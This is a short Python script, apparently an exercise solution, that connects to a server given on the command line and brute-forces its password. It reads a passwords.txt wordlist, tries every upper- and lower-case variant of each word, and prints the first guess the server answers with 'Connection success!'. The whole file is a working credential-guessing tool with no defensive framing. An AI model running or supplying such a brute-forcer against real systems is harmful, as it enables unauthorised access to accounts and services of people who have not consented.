import itertools
import os
import socket
import sys

ip_address = sys.argv[1]
port = int(sys.argv[2])

with socket.socket() as client_socket:
    address = (ip_address, port)
    client_socket.connect(address)

    with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "passwords.txt"), "r") as file:
        for word in file:
            word = word.strip()
            product = itertools.product(*zip(word.upper(), word.lower()))
            unique_combinations = set(''.join(item) for item in product)
            for password in unique_combinations:
                try:
                    client_socket.send(password.encode('utf8'))
                    response = client_socket.recv(1024).decode('utf8')
                    if response == 'Connection success!':
                        print(password)
                        break
                except:
                    pass
